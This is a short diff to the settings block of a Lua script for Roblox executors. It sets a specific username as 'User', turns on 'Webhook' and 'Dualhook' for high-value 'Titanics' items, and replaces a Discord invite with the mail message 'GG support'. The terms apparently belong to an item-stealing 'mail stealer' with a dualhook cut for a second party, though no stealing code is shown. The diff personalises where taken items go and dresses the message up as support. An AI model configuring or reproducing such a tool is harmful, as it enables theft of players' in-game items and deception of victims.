@@ -8,9 +8,9 @@
 ]]--
 
 getgenv().Settings = {
-    User = "User Here",
+    User = "Trex_kid9",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = ".gg/uSgzNwHDTS",
+    MailMessage = "GG support",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
